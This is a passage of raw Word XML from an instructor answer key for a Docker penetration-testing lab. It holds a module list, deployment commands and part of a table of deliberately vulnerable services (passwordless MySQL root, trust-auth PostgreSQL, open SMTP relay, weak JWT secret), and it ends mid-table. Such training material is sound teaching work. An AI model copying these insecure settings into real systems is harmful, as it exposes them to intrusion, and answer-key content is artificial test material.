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8A6D1A"/>
          <w:sz w:val="60"/>
        </w:rPr>
        <w:t>Knossos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>Instructor Walkthrough &amp; Answer Key</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Companion to Professional Penetration Testing, 3rd Edition</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Version 1.2.0  ·  Lab v0.6.0  ·  33 modules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="B03028"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>INSTRUCTOR COPY. Contains every flag, credential, and full solution. Do not distribute to students.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1. Deploying the lab from Git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2. Lab reference</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">      Topology and addresses  ·  Credentials  ·  Static flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3. Module walkthroughs</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
        </w:rPr>
        <w:t xml:space="preserve">      Phase 1: DMZ · External Foothold</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            1. Reconnaissance</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            2. Delivery and Phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            3. Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            4. Database Exploitation (MySQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            5. Database Exploitation (PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            6. Remote Desktop (VNC)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            7. Mail Server Enumeration (SMTP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            8. Web Application (DVWA)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            9. Modern Web (Juice Shop)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            10. SSO Token Forgery (JWT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
        </w:rPr>
        <w:t xml:space="preserve">      Phase 2: Internal · Pivot and Escalate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            11. Post-Exploitation Pillaging</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            12. Vulnerability Scanning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            13. Directory Enumeration (LDAP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            14. Web Content Discovery</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            15. Secrets in Source Control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            16. Credentials in the Wiki</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            17. Password Attack (SSH)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            18. Password Spraying</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            19. Weaponization and Payload Delivery (msfvenom)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            20. Installation and Persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            21. Command and Control</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            22. Command and Control (Sliver)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            23. Local Password Attack and Privilege Escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            24. Privilege Escalation (SUID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            25. Privilege Escalation (sudo)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            26. Credential Reuse and Lateral Movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            27. Actions on Objectives</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            28. Targeting the Network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            29. Log Mining</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            30. Kerberoasting (offline)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            31. Data Exfiltration (DNS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            32. Wireless Handshake Cracking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="8A6D1A"/>
        </w:rPr>
        <w:t xml:space="preserve">      Phase 3: Restricted · Crown Jewels</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">            33. Deep Pivot to the Restricted Segment</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="0F5C46"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1. Deploying the lab from Git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>The lab is one Docker Compose stack. These steps bring up the whole lab, plant the flags automatically, and start the Kali attacker box. Run them on the Docker host (Docker Desktop on Windows, from PowerShell).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a. Clone the repository</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># private repo twilhelm-git/meridian-lab; the lab lives under lab/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>gh repo clone twilhelm-git/meridian-lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># or: git clone https://github.com/twilhelm-git/meridian-lab.git</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>cd meridian-lab\lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>b. Pin image digests (first time, on a host with internet)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>copy .env.example .env</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell -ExecutionPolicy Bypass -File scripts\pin-digests.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># resolves each image to name@sha256 so every deploy is identical</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>c. Bring up the lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>docker compose up -d --build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># builds all targets + Kali, waits for health, plants flags via the flag-init service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># first Kali build is slow: it installs metasploit-framework and downloads Sliver</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>The C2 server and Kali download the Sliver binary from GitHub at build time, so the build host needs internet (this is why it is built on your Docker host, not the cloud).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r>
        <w:t>flags.generated.env is written in the lab folder with every per-deploy flag value (gitignored).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>d. Open the control center and verify</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># scoreboard / landing page:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>start http://localhost:8890</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># every service should show a green (up) dot grouped by zone</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>e. Get a shell on Kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># browser terminal:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>start http://localhost:7681</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># or a direct shell:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>docker exec -it pentesttv-kali bash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Kali is dual-homed: 172.28.10.10 on the DMZ and 172.28.20.10 on the internal network. Your own desktop cannot reach the internal segment or the target service ports directly; only the DMZ web apps publish host ports. Everything else is reached from Kali or by pivoting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="5B6570"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>f. Reset when needed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>docker compose down -v        # tear down and wipe volumes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>docker compose up -d --build  # fresh deploy, new flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># or use the scoreboard buttons: reset progress / re-plant flags / reset lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># note: DB and VNC flags only rotate on a full down -v + up (they seed at container init)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Lab reference</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Topology and addresses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Container</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Net</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Role</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-dns</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.34</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Authoritative DNS, open zone transfer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-target</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.20 / .20.20</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ+Int</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Linux exploitation target (Samba, vsftpd)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-mysql</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.40</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>MySQL, remote root no password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-postgres</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>PostgreSQL, trust auth</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-vnc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.42</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>VNC desktop, weak password (host 5901)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-smtp</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.43</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SMTP open relay, VRFY enumeration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-intranet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.130</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Intranet web, hidden /backup (host 8082)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-git</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.131</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Git/CI, secrets in history (host 8083)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-wiki</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.20.132</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Internal wiki, leaks ops creds (host 8084)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-sso</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>172.28.10.72</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SSO/JWT, weak HS256 secret (host 8085)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>pentesttv-c2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
          </w:tcPr>
          <w:p>
            <w:r>
